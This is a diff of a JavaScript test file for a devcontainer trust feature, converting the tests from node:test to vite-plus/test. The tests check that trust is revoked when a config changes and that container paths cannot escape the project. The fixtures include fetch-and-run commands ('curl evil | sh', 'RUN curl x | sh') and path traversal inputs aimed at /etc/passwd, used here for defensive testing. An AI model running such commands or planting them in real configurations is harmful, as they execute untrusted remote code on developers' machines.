@@ -1,5 +1,4 @@
-import assert from "node:assert/strict";
-import { test } from "node:test";
+import { expect, test } from "vite-plus/test";
 import { mkdtemp, mkdir, writeFile, symlink, rm } from "node:fs/promises";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
@@ -12,25 +11,23 @@ import {
 
 const ids = (config) => classifyDevcontainer(config).map((finding) => finding.id);
 
-await test("only elevated capabilities need a trust decision", () => {
-  assert.deepEqual(
+test("only elevated capabilities need a trust decision", () => {
+  expect(
     ids({ image: "node:24", forwardPorts: [3000], containerEnv: { A: "1" }, remoteUser: "node" }),
-    [],
-  );
-  assert.deepEqual(ids({ initializeCommand: "make host", features: { "ghcr.io/x/y:1": {} } }), [
+  ).toStrictEqual([]);
+  expect(ids({ initializeCommand: "make host", features: { "ghcr.io/x/y:1": {} } })).toStrictEqual([
     "initialize-command",
     "features",
   ]);
-  assert.deepEqual(
+  expect(
     ids({ build: { dockerfile: "Dockerfile" }, runArgs: ["--privileged"], mounts: ["a"] }).sort(),
-    ["build", "mounts", "run-args"],
-  );
-  assert.deepEqual(ids({ postCreateCommand: ["npm", "i"], remoteUser: "root" }), [
+  ).toStrictEqual(["build", "mounts", "run-args"]);
+  expect(ids({ postCreateCommand: ["npm", "i"], remoteUser: "root" })).toStrictEqual([
     "lifecycle",
     "root-user",
   ]);
-  assert.deepEqual(ids({ privileged: false, capAdd: [], mounts: [] }), []);
-  assert.deepEqual(ids(null), []);
+  expect(ids({ privileged: false, capAdd: [], mounts: [] })).toStrictEqual([]);
+  expect(ids(null)).toStrictEqual([]);
 });
 
 const roots = [];
@@ -50,22 +47,24 @@ const JSONC = `{
   "initializeCommand": "echo host",
 }`;
 
-await test("trust is bound to the exact configuration and falls back when it changes", async () => {
+test("trust is bound to the exact configuration and falls back when it changes", async () => {
   const { path, project } = await fixture(JSONC);
   let state = devcontainerState(project);
-  assert.equal(state.found, true);
-  assert.equal(state.name, "demo");
-  assert.equal(state.needsDecision, true);
-  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);
+  expect(state.found).toBe(true);
+  expect(state.name).toBe("demo");
+  expect(state.needsDecision).toBe(true);
+  expect(devcontainerLaunch(project, ["bash"])).toBe(undefined);
 
-  await assert.rejects(decideDevcontainer(project, "trusted", "not-the-shown-hash"), /изменилась/);
+  await expect(decideDevcontainer(project, "trusted", "not-the-shown-hash")).rejects.toThrow(
+    /изменилась/,
+  );
   state = await decideDevcontainer(project, "trusted", state.hash);
-  assert.equal(state.decision, "trusted");
-  assert.equal(state.needsDecision, false);
+  expect(state.decision).toBe("trusted");
+  expect(state.needsDecision).toBe(false);
   const launch = devcontainerLaunch(project, ["/bin/bash", "-i", "-c", "echo 'q'"]);
-  assert.equal(launch.file, "/bin/sh");
-  assert.deepEqual(launch.args.slice(-4), ["/bin/bash", "-i", "-c", "echo 'q'"]);
-  assert.match(launch.args[1], /\bup\b[\s\S]*\bexec\b/);
+  expect(launch.file).toBe("/bin/sh");
+  expect(launch.args.slice(-4)).toStrictEqual(["/bin/bash", "-i", "-c", "echo 'q'"]);
+  expect(launch.args[1]).toMatch(/\bup\b[\s\S]*\bexec\b/);
 
   // Editing the config after the decision revokes it until the user decides again.
   await writeFile(
@@ -73,65 +72,64 @@ await test("trust is bound to the exact configuration and falls back when it cha
     JSONC.replace("echo host", "curl evil | sh"),
   );
   state = devcontainerState(project);
-  assert.equal(state.stale, true);
-  assert.equal(state.decision, null);
-  assert.equal(state.needsDecision, true);
-  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);
+  expect(state.stale).toBe(true);
+  expect(state.decision).toBe(null);
+  expect(state.needsDecision).toBe(true);
+  expect(devcontainerLaunch(project, ["bash"])).toBe(undefined);
 
   state = await decideDevcontainer(project, "declined", state.hash);
-  assert.equal(state.decision, "declined");
-  assert.equal(state.needsDecision, false);
-  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);
+  expect(state.decision).toBe("declined");
+  expect(state.needsDecision).toBe(false);
+  expect(devcontainerLaunch(project, ["bash"])).toBe(undefined);
 
   state = await decideDevcontainer(project, "forget");
-  assert.equal(state.decision, null);
+  expect(state.decision).toBe(null);
 });
 
-await test("a changed Dockerfile also invalidates trust", async () => {
+test("a changed Dockerfile also invalidates trust", async () => {
   const { path, project } = await fixture(JSON.stringify({ build: { dockerfile: "Dockerfile" } }));
   await writeFile(join(path, ".devcontainer", "Dockerfile"), "FROM node:24\n");
   const first = devcontainerState(project);
   await decideDevcontainer(project, "trusted", first.hash);
-  assert.ok(devcontainerLaunch(project, ["bash"]));
+  expect(devcontainerLaunch(project, ["bash"])).toBeTruthy();
   await writeFile(join(path, ".devcontainer", "Dockerfile"), "FROM node:24\nRUN curl x | sh\n");
-  assert.equal(devcontainerState(project).decision, null);
-  assert.equal(devcontainerLaunch(project, ["bash"]), undefined);
+  expect(devcontainerState(project).decision).toBe(null);
+  expect(devcontainerLaunch(project, ["bash"])).toBe(undefined);
 });
 
-await test("a config symlinked out of the project is ignored", async () => {
+test("a config symlinked out of the project is ignored", async () => {
   const { root, path } = await fixture("{}");
   const other = join(root, "outside.json");
   await writeFile(other, JSON.stringify({ initializeCommand: "x" }));
   const linked = join(root, "linked");
   await mkdir(linked);
   await symlink(other, join(linked, ".devcontainer.json"));
-  assert.equal(devcontainerState({ id: "l", name: "l", path: linked }).found, false);
-  assert.equal(devcontainerState({ id: "p", name: "p", path }).found, true);
+  expect(devcontainerState({ id: "l", name: "l", path: linked }).found).toBe(false);
+  expect(devcontainerState({ id: "p", name: "p", path }).found).toBe(true);
 });
 
-await test("projects without a config have nothing to decide", async () => {
+test("projects without a config have nothing to decide", async () => {
   const root = await mkdtemp(join(tmpdir(), "projector-devcontainer-"));
   roots.push(root);
   const state = devcontainerState({ id: "n", name: "n", path: root });
-  assert.equal(state.found, false);
-  assert.equal(state.needsDecision, false);
-  await assert.rejects(
+  expect(state.found).toBe(false);
+  expect(state.needsDecision).toBe(false);
+  await expect(
     decideDevcontainer({ id: "n", name: "n", path: root }, "trusted", "x"),
-    /нет devcontainer/,
-  );
+  ).rejects.toThrow(/нет devcontainer/);
 });
 
 const { containerToHost } = await import("../server/modules/terminal/link-files.ts");
-await test("terminal links map container paths into the project and refuse escapes", () => {
+test("terminal links map container paths into the project and refuse escapes", () => {
   const map = (path) => containerToHost(path, "/workspaces/app", "/home/me/app");
-  assert.equal(map("/workspaces/app/src/a.ts"), "/home/me/app/src/a.ts");
-  assert.equal(map("src/a.ts"), "/home/me/app/src/a.ts");
-  assert.equal(map("/workspaces/app"), "/home/me/app");
-  assert.throws(() => map("/etc/passwd"), /вне проекта/);
-  assert.throws(() => map("~/x"), /вне проекта/);
-  assert.throws(() => map("/workspaces/app/../../etc/passwd"), /за пределы/);
-  assert.throws(() => map("../secret"), /за пределы/);
-  assert.throws(() => map("/workspaces/application/x"), /вне проекта/);
+  expect(map("/workspaces/app/src/a.ts")).toBe("/home/me/app/src/a.ts");
+  expect(map("src/a.ts")).toBe("/home/me/app/src/a.ts");
+  expect(map("/workspaces/app")).toBe("/home/me/app");
+  expect(() => map("/etc/passwd")).toThrow(/вне проекта/);
+  expect(() => map("~/x")).toThrow(/вне проекта/);
+  expect(() => map("/workspaces/app/../../etc/passwd")).toThrow(/за пределы/);
+  expect(() => map("../secret")).toThrow(/за пределы/);
+  expect(() => map("/workspaces/application/x")).toThrow(/вне проекта/);
 });
 
 await Promise.all(roots.map((root) => rm(root, { recursive: true, force: true })));
